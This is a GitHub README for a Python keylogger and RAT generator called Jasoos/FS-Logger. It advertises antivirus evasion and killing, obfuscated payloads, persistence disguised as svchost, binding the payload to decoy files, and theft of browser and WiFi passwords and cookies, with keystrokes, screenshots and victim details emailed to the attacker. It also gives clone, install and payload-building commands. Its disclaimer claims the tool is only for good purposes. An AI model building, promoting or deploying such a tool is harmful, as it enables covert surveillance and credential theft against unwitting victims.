<p align="center">
  <img src="https://github.com/F-Society-Official/FS-Logger/blob/main/j.png" alt="fs-Logger Logo" width=200 height=200/>
</p>

<h1 align="center">JASOOS</h1>
<p align="center">
    <a href="https://python.org">
    <img src="https://img.shields.io/badge/Python-3.9-green.svg">
  </a>
  <a href="https://github.com/1ucif3r/jasoos/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-GNU%203.0-lightgrey.svg">
  </a>
  <a href="https://github.com/1ucif3r/jasoos/releases">
    <img src="https://img.shields.io/badge/Release-1.0-blue.svg">
  </a>
    <a href="https://github.com/1ucif3r">
    <img src="https://img.shields.io/badge/1ucif3r-%E2%9D%A4-brightgreen.svg">
  </a>
</p>


Jasoos is Keylogger Generator for Windows/Linux, which sends key-logs & screenshot via email with other  target info written in Python .

## Disclaimer
<p align="center">
  :computer: This project was created only for good purposes and personal use.
</p>

YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.

## Features
- [x] Works on Windows/Linux
- [x] Notify New Victim Via Email
- [x] Undetectable
- [x] Persistence
- [x] Sends Screenshot of Victim PC's Screen via email
- [x] Creates Executable Binary With Zero Dependencies
- [x] Create less size ~ 5mb payload with advance functionality
- [x] Obfusticate the Payload before Generating it, hence Bypassing few more antivirus
- [x] Generated Payload is Encryted with base64, hence makes extremely difficult to reverse engineer the payload
- [x] Function to Kill Antivirus on Victim PC and tries to disable the security
- [x] Awesome Colourful Interface to generate payload
- [x] On Attacker Side: While Creating Payload, Script Automatically Detects Missing Dependencies & Installs Them
- [x] Distinguish Log Data on the Basics of Active Window Name  
- [x] Able to add custom Icon to evil file 
- [x] **Built-in Binder** which can bind Keylogger to **Any File** [.pdf, .txt, .exe etc], Running legitimate file on front end & evil codes in back-end as a service. 
- [x] Checks for **Already Running Instance** on System, If running instance found, then only legitimate file is executed [**Multiple Instance Prohibiter** to avoid Same Muliple Logs Email].
- [x] Attacker can Create/Compile for Both **Windows/Linux OS** Using Linux System, But Can only Create/Compile **Windows** Executable using Windows Machine
- [x] Retrieves Saved Passwords from victim System and sends it to Attacker.

| Built-in Stealer Can Steal These Things : |
| ----------------------------------------------------------- |
| Chrome Browser (Saved Password) |
| WiFi (Saved Password) |
| Chrome Cookies (Login Data, Cookies, History) |
| Firefox Cookies (cookies.sqlite) |
#### Note: Custom Stealer is Coded, does not relies on LaZagne

- [x] Grabs & Send Useful Information of Victim's Device

| These Things are Grabbed & Sended: |
| -----------------------------------|
| Operating System |
| Computer Name    |
| User Name |
| Public IPv4 |

## Tested On
[![Kali)](https://www.google.com/s2/favicons?domain=https://www.kali.org/)](https://www.kali.org) **Kali Linux - ROLLING EDITION**

[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 10 - Pro**

## Prerequisite
- [x] Python 3.X

## How To Use in Linux
```bash
# Navigate to the /opt directory (optional)
$ cd /opt/

# Clone this repository
$ git clone https://github.com/F-Society-Official/FS-Logger.git

# Navigate to FS-Logger folder
$ cd FS-Logger

# Installing dependencies
$ bash installer_linux.sh

*** Note When The Python Installer DialogBox Appear while executing installer_linux.sh ***
    * Click on custom install 
    * Select Path to : C:/Python37-32
    ### So that the python is installed in this path (Inside Wine) : ~/.wine/drive_c/Python37-32

# If you are getting any errors while executing installer_linux.sh, try to install using installer_linux.py
$ python3 installer_linux.py

$ chmod +x fslogger.py
$ python3 fslogger.py --help

# Making Payload/RAT
$ python3 fslogger.py -e youremail@gmail.com -p YourEmailPass -i Interval -t TIME_PERSISTENT -s -o output_file_name --icon icon_path

Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
```

## How To Use in Windows
```bash
# Install dependencies 
$ Install latest python 3.x

# Clone this repository
$ git clone https://github.com/F-Society-Official/FS-Logger.git

# Go into the repository
$ cd FS-Logger

# Installing dependencies
$ python -m pip install -r requirements.txt

# Open fslogger.py in Text editor and Configure Line 12 WINDOWS_PYTHON_PYINSTALLER_PATH = "C:/Python39/Scripts/pyinstaller.exe" 

# Getting Help Menu
$ python fslogger.py --help

# Making Payload/RAT
$ python fslogger.py -e youremail@gmail.com -p YourEmailPass -i Interval -t TIME_PERSISTENT -s -o output_file_name --icon icon_path

Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
```

## How to Update

* Run updater.py to Update Autmatically or Download the latest Zip from this GitHub repo
* Note: Git Must be Installed in order to use updater.py

## Note:- Evil File will be saved inside dist/ folder, inside FS-Logger/ folder

## Available Arguments 
* Optional Arguments

| Short Hand  | Full Hand | Description |
| ----------  | --------- | ----------- |
| -h          | --help    | show this help message and exit |
| -i INTERVAL | --interval INTERVAL | Time between reports in seconds. default=120|
| -t TIME_PERSISTENT | --persistence TIME_PERSISTENT | Becoming Persistence After __ seconds. default=10 |
|  -w | --windows | Generate a Windows executable. |
|  -l | --linux   | Generate a Linux executable. |
|  -s | --steal-password | Steal Saved Password from Victim Machine [**Supported OS : Windows**] |
| -b file.txt | --bind LEGITIMATE_FILE_PATH.pdf | AutoBinder : Specify Path of Legitimate file. [**Supported OS : Windows**] |
| -d | --debug | Payload Will Run In Foreground with CMD Window, To get Appropriate Execution Error |
#### Note : Either **-w/--windows** or  **-l/--linux** must be specified 

* Required Arguments

| Short Hand  | Full Hand | Description |
| ----------  | --------- | ----------- |
|             | --icon ICON   | Specify Icon Path, Icon of Evil File [**Note : Must Be .ico**] |
| -e EMAIL    | --email EMAIL | Email address to send reports to. |
| -p PASSWORD | --password PASSWORD | Password for the email address given in the -e argument. |
| -o OUT      | --out OUT    | Output file name.|

## Removing fslogger in Windows:

#### Method 1:

   * Go to start, type regedit and run the first program, this will open the registry editor.
   * Navigate to the following path Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run There should be an entry called svchost, right click this entry and select Delete.
   * Go to your user path > AppData > Roaming, you’ll see a file named “svchost.exe”, this is the RAT, right click > Delete.
   * Restart the System.

#### Method 2:
   * Run "RemovefsLogger.bat" in Infected System and then restart the PC to stop the current Running Evil File.



## Removing fsLogger in Linux:

   * Open Autostart file with any text editor,
     ****Autostart File Path: ~/.config/autostart/xinput.desktop****
   * Remove these 5 lines:
   
            [Desktop Entry]
            Type=Application
            X-GNOME-Autostart-enabled=true
            Name=Xinput
            Exec="destination_file_name"
        
   * Note: **destination_file_name** is that name of evil_file which you gave 
      to your Keylogger using -o parameter
   * Reboot your system and then delete the evil file stored this this below path
   * Destination Path, where Keylogger is stored : **~/.config/xnput**

### Development by

Developer / Author: [th3_1ucif3r](https://www.instagram.com/th3_1ucif3r/)

### <h2 align="center">😈 Follow 😈 </h2>
<p align="center">
<a href="https://www.instagram.com/th3_1ucif3r/"><img title="Instagram" src="https://img.shields.io/badge/instagram-%23E4405F.svg?&style=for-the-badge&logo=instagram&logoColor=white"></a>
<a href="https://wa.me/916370174459"><img title="whatsapp" src="https://img.shields.io/badge/WHATSAPP-%2325D366.svg?&style=for-the-badge&logo=whatsapp&logoColor=white"></a>
<a href="https://www.facebook.com/profile.php?id=100008549411115"><img title="facebook" src="https://img.shields.io/badge/facebook-%231877F2.svg?&style=for-the-badge&logo=facebook&logoColor=white"></a>
<a href="https://www.twitter.com/Hritikkumbhar18/"><img title="twitter" src="https://img.shields.io/badge/twitter-%231DA1F2.svg?&style=for-the-badge&logo=twitter&logoColor=white"></a>
<a href="https://t.me/th3_1ucif3r"><img title="Telegram" src="https://img.shields.io/badge/Telegram-blue?style=for-the-badge&logo=Telegram"></a>
</p>
